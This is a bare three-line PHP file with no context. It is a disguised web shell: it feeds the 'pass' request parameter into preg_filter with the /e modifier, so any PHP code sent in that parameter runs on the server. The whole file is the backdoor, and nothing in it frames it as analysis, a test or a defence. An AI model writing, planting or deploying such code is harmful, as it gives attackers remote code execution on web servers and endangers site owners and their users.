<?php
echo preg_filter('|.*|e', $_REQUEST['pass'], '');
?>